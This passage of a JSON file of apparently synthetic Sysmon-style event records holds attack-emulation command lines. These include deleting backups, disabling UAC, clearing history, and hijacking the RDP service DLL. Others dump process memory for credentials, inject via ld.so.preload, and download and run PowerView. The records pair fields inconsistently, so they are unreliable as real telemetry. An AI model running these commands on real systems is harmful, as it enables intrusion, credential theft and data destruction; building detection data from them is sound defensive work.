        "LogonGuid": "e7e3f942-b2e4-451b-befd-892d183e5eff",
        "SourceProcessID": 9720,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Program Files\\pretty..exe",
        "DestinationProcessID": 5838,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Users\\Public\\might..exe",
        "UtcTime": "2024-05-17T01:36:51.626520Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "web-77.perry.com",
        "User": "jacksonmegan",
        "ProcessID": 9537,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"users\\nw\\nwho\\n\",",
        "LogonID": 981319,
        "LogonGuid": "be136cb5-c32a-4fc9-ac32-4530c09d5ec5",
        "SourceProcessID": 6977,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Program Files\\language..dll",
        "DestinationProcessID": 3840,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Users\\Public\\plan..dll",
        "UtcTime": "2024-05-17T01:36:51.626520Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "srv-02.long-baker.com",
        "User": "tbullock",
        "ProcessID": 8889,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"TEST=$(echo $HISTCONTROL)\\nif [ \\\"$HISTCONTROL\\\" != \\\"ignoreboth\\\" ]; then export HISTCONTROL=\\\"ignoreboth\\\"; fi\\nhistory -c \\nls -la $HISTFILE # \\\" ls -la $HISTFILE\\\"\\nif [ $(history |wc -l) -eq 1 ]; then echo \\\"ls -la is not in history cache\\\"; fi\\n# -> ls -la is not in history cache\\nif [ \\\"$HISTCONTROL\\\" != \\\"erasedups\\\" ]; then export HISTCONTROL=\\\"erasedups\\\"; fi\\nhistory -c \\nls -la $HISTFILE\\nls -la $HISTFILE\\nls -la $HISTFILE\\nif [ $(history |wc -l) -eq 2 ]; then echo \\\"Their is only one entry for ls -la $HISTFILE\\\"; fi\\n\",",
        "LogonID": 153851,
        "LogonGuid": "27e0dce0-080e-42a6-8885-092e271e1f0d",
        "SourceProcessID": 1600,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Program Files\\high..dll",
        "DestinationProcessID": 6830,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Program Files\\sing..exe",
        "UtcTime": "2024-05-17T01:36:51.626520Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "lt-39.estrada-stephens.com",
        "User": "stephensjaime",
        "ProcessID": 4063,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"echo \\\"test\\\" > #{file_name} | set-content -path test.txt -stream #{ads_filename} -value \\\"test\\\"\\nset-content -path #{file_name} -stream #{ads_filename} -value \\\"test2\\\"\\nset-content -path . -stream #{ads_filename} -value \\\"test3\\\"\\n\",",
        "LogonID": 639334,
        "LogonGuid": "d34a0cb4-f5d6-4084-9c60-ceb65fc042de",
        "SourceProcessID": 8612,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Windows\\boy..dll",
        "DestinationProcessID": 4943,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Program Files\\owner..exe",
        "UtcTime": "2024-05-17T01:36:51.626520Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "desktop-09.torres.com",
        "User": "carol29",
        "ProcessID": 7980,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"powershell -c {get-eventlog 'Security' | where {$_.Message -like '*SYSTEM*'} | export-csv $env:temp\\\\T1654_events.txt}\",",
        "LogonID": 362385,
        "LogonGuid": "efb90bb5-eef7-49fb-bc2f-625df3239f01",
        "SourceProcessID": 2689,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Program Files\\theory..dll",
        "DestinationProcessID": 8448,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Windows\\friend..dll",
        "UtcTime": "2024-05-17T01:36:51.626520Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "db-65.coffey-gibson.com",
        "User": "breannawilliams",
        "ProcessID": 8464,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"hh.exe #{remote_chm_file}\\n\",",
        "LogonID": 303068,
        "LogonGuid": "8757f73f-fce2-4b40-b0b8-b189da34337c",
        "SourceProcessID": 4172,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Program Files\\enter..exe",
        "DestinationProcessID": 2206,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Program Files\\reach..dll",
        "UtcTime": "2024-05-17T01:36:51.627522Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "desktop-42.yu-campbell.net",
        "User": "thomasjeffrey",
        "ProcessID": 8775,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"del /s /f /q c:\\\\*.VHD c:\\\\*.bac c:\\\\*.bak c:\\\\*.wbcat c:\\\\*.bkf c:\\\\Backup*.* c:\\\\backup*.* c:\\\\*.set c:\\\\*.win c:\\\\*.dsk\\n\",",
        "LogonID": 998052,
        "LogonGuid": "e2ac60ab-554b-4e1a-9c42-eab66234378b",
        "SourceProcessID": 2060,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Users\\Public\\that..dll",
        "DestinationProcessID": 6394,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Program Files\\dark..exe",
        "UtcTime": "2024-05-17T01:36:51.627522Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "lt-90.gordon-jones.com",
        "User": "hernandezchristopher",
        "ProcessID": 7648,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"reg add \\\"HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer\\\" /v HideSCAHealth /t REG_DWORD /d 1 /f\\n\",",
        "LogonID": 692860,
        "LogonGuid": "f5812f47-0d57-4755-bff5-fcd149fc0647",
        "SourceProcessID": 7637,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Users\\Public\\party..dll",
        "DestinationProcessID": 7684,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Windows\\human..dll",
        "UtcTime": "2024-05-17T01:36:51.627522Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "laptop-98.ramos-robinson.info",
        "User": "jenniferedwards",
        "ProcessID": 7120,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"REG ADD HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnceEx\\\\0001\\\\Depend /v 1 /d \\\"#{thing_to_execute}\\\"\\n\",",
        "LogonID": 752382,
        "LogonGuid": "2aa9b614-67e8-475e-a2b2-f8ba5a80ecaf",
        "SourceProcessID": 9129,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Program Files\\receive..exe",
        "DestinationProcessID": 2994,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Program Files\\dinner..exe",
        "UtcTime": "2024-05-17T01:36:51.627522Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "web-85.everett.com",
        "User": "rfischer",
        "ProcessID": 1101,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"$termsrvDll = \\\"C:\\\\Windows\\\\System32\\\\termsrv.dll\\\"\\n\\n$ACL = Get-Acl $termsrvDll\\n$permission = \\\"Administrators\\\",\\\"FullControl\\\",\\\"Allow\\\"\\n$accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule $permission\\n$ACL.SetAccessRule($accessRule)\\nSet-Acl -Path $termsrvDll -AclObject $ACL\\n\\nCopy-Item -Path $termsrvDll -Destination \\\"$HOME\\\\AtomicTest.dll\\\"\\n\\n$newServiceDll = \\\"$HOME\\\\AtomicTest.dll\\\"\\n\\n$registryPath = \\\"HKLM:\\\\System\\\\CurrentControlSet\\\\services\\\\TermService\\\\Parameters\\\"\\n\\n# Check if the registry key exists\\nif (Test-Path -Path $registryPath) {\\n    # Modify the ServiceDll value in the registry\\n    Set-ItemProperty -Path $registryPath -Name \\\"ServiceDll\\\" -Value $newServiceDll\\n    Write-Host \\\"ServiceDll value in the registry has been updated to: $newServiceDll\\\"\\n} else {\\n    Write-Host \\\"Registry key not found. Make sure the 'TermService\\\\Parameters' key exists.\\\"\\n}\",",
        "LogonID": 874336,
        "LogonGuid": "44359a0d-766a-401c-8031-aca0005101e4",
        "SourceProcessID": 9877,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Users\\Public\\choose..exe",
        "DestinationProcessID": 9246,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Windows\\school..dll",
        "UtcTime": "2024-05-17T01:36:51.627522Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "email-83.moody-smith.com",
        "User": "justincoffey",
        "ProcessID": 3669,
        "ProcessName": "malware.exe",
        "CommandLine": "\"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-EnumerateLocalAdmin  -Verbose\\n\",",
        "LogonID": 237909,
        "LogonGuid": "c799463f-16c9-4e15-8849-17372c22488b",
        "SourceProcessID": 7904,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Program Files\\large..exe",
        "DestinationProcessID": 8467,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Windows\\always..dll",
        "UtcTime": "2024-05-17T01:36:51.628521Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "lt-63.elliott.biz",
        "User": "penny81",
        "ProcessID": 3961,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"echo \\\"\\\" > #{history_path}\\n\",",
        "LogonID": 518011,
        "LogonGuid": "2b1c7339-788a-4cc9-86f4-e59b2cc964e8",
        "SourceProcessID": 7325,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Windows\\season..exe",
        "DestinationProcessID": 9172,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Windows\\wind..exe",
        "UtcTime": "2024-05-17T01:36:51.628521Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "db-54.orozco.biz",
        "User": "khanrandall",
        "ProcessID": 4722,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"mkdir -p #{test_folder}\\ncd #{test_folder}; touch a b c d e f g\\nzip --password \\\"#{encryption_password}\\\" #{test_folder}/#{test_file} ./*\\necho \\\"#{encryption_password}\\\" | gpg --batch --yes --passphrase-fd 0 --output #{test_folder}/#{test_file}.zip.gpg -c #{test_folder}/#{test_file}.zip\\nls -l #{test_folder}\\n\",",
        "LogonID": 144039,
        "LogonGuid": "8b5d6dfc-ef5b-4784-9550-44c58c521280",
        "SourceProcessID": 6051,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Windows\\thousand..dll",
        "DestinationProcessID": 1460,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Windows\\low..dll",
        "UtcTime": "2024-05-17T01:36:51.628521Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "laptop-20.calderon.org",
        "User": "xwilson",
        "ProcessID": 4612,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"sudo sh -c 'echo #{path_to_shared_library} > /etc/ld.so.preload'\\n\",",
        "LogonID": 334891,
        "LogonGuid": "6389a50d-6799-4b64-be21-b4e7a1866bae",
        "SourceProcessID": 9188,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Users\\Public\\civil..dll",
        "DestinationProcessID": 7355,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Windows\\well..exe",
        "UtcTime": "2024-05-17T01:36:51.628521Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "desktop-09.nelson.com",
        "User": "johnclark",
        "ProcessID": 2768,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"$startingDirectory = \\\"#{starting_directory}\\\"\\n$outputZip = \\\"#{output_zip_folder_path}\\\"\\n$fileExtensionsString = \\\"#{file_extensions}\\\" \\n$fileExtensions = $fileExtensionsString -split \\\", \\\"\\n\\nNew-Item -Type Directory $outputZip -ErrorAction Ignore -Force | Out-Null\\n\\nFunction Search-Files {\\n  param (\\n    [string]$directory\\n  )\\n  $files = Get-ChildItem -Path $directory -File -Recurse | Where-Object {\\n    $fileExtensions -contains $_.Extension.ToLower()\\n  }\\n  return $files\\n}\\n\\n$foundFiles = Search-Files -directory $startingDirectory\\nif ($foundFiles.Count -gt 0) {\\n  $foundFilePaths = $foundFiles.FullName\\n  Compress-Archive -Path $foundFilePaths -DestinationPath \\\"$outputZip\\\\data.zip\\\"\\n\\n  Write-Host \\\"Zip file created: $outputZip\\\\data.zip\\\"\\n  } else {\\n      Write-Host \\\"No files found with the specified extensions.\\\"\\n  }\\n\",",
        "LogonID": 632914,
        "LogonGuid": "1e7c2ad3-323c-4e2e-83c9-c780fc384094",
        "SourceProcessID": 8586,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Users\\Public\\claim..exe",
        "DestinationProcessID": 9874,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Windows\\current..dll",
        "UtcTime": "2024-05-17T01:36:51.629522Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "db-78.palmer.com",
        "User": "porteraaron",
        "ProcessID": 6427,
        "ProcessName": "malware.exe",
        "CommandLine": "\"find / -path \\\"*.mozilla/firefox/*/places.sqlite\\\" 2>/dev/null -exec echo {} >> #{output_file} \\\\;\\ncat #{output_file} 2>/dev/null\\n\",",
        "LogonID": 589813,
        "LogonGuid": "8b47a043-747b-4976-8e0e-8e780b272951",
        "SourceProcessID": 2529,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Program Files\\else..dll",
        "DestinationProcessID": 5756,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\under..dll",
        "UtcTime": "2024-05-17T01:36:51.629522Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "db-15.potter-hendricks.com",
        "User": "sbeard",
        "ProcessID": 8047,
        "ProcessName": "nc.exe",
        "CommandLine": "\"export AWS_REGION=#{aws_region}\\ncd #{stratus_path}\\necho \\\"Stratus: Start Warmup.\\\"\\n./stratus warmup aws.discovery.ec2-enumerate-from-instance\\necho \\\"Stratus: Start Detonate.\\\"\\n./stratus detonate aws.discovery.ec2-enumerate-from-instance\\n\",",
        "LogonID": 636996,
        "LogonGuid": "41bcd4f2-8fd1-40e7-84fc-06ec0d910532",
        "SourceProcessID": 1910,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Windows\\last..exe",
        "DestinationProcessID": 3204,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Program Files\\method..dll",
        "UtcTime": "2024-05-17T01:36:51.629522Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "email-27.flynn-salas.com",
        "User": "frankfoster",
        "ProcessID": 7824,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"Set-Location -path \\\"#{file_path}\\\\Sysinternals\\\";\\n./accesschk.exe -accepteula .;\\n\",",
        "LogonID": 512757,
        "LogonGuid": "a6d5b3b6-bb48-4cec-8ec3-93f7ebd5d425",
        "SourceProcessID": 2955,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Users\\Public\\more..exe",
        "DestinationProcessID": 3122,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Users\\Public\\hotel..dll",
        "UtcTime": "2024-05-17T01:36:51.629522Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "laptop-30.jackson.com",
        "User": "fjackson",
        "ProcessID": 4727,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore)\\nif($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }\\nC:\\\\Windows\\\\System32\\\\rundll32.exe C:\\\\windows\\\\System32\\\\comsvcs.dll, MiniDump $id $env:TEMP\\\\svchost-exe.dmp full\\n\",",
        "LogonID": 279109,
        "LogonGuid": "c39571b5-3068-4573-9abb-1a8b00944b88",
        "SourceProcessID": 5299,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Windows\\according..exe",
        "DestinationProcessID": 6599,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Users\\Public\\arm..dll",
        "UtcTime": "2024-05-17T01:36:51.629522Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "db-75.matthews-brown.com",
        "User": "daniel23",
        "ProcessID": 2697,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"reg.exe ADD HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System /v EnableLUA /t REG_DWORD /d 0 /f\\n\",",
        "LogonID": 294446,
        "LogonGuid": "ec6d4dd4-65ec-490f-890d-c9c920f5c683",
        "SourceProcessID": 3668,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\nor..dll",
        "DestinationProcessID": 8697,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Users\\Public\\edge..exe",
        "UtcTime": "2024-05-17T01:36:51.630524Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "desktop-70.hughes.net",
        "User": "patriciabender",
        "ProcessID": 6424,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"Invoke-ATHHTMLApplication -ScriptEngine #{script_engine} -InlineProtocolHandler #{protocol_handler} -MSHTAFilePath #{mshta_file_path}\",",
        "LogonID": 255842,
        "LogonGuid": "8c57c155-f489-49b0-9725-36967756463e",
        "SourceProcessID": 4144,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Windows\\participant..exe",
        "DestinationProcessID": 1100,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Program Files\\red..exe",
        "UtcTime": "2024-05-17T01:36:51.630524Z"
    },
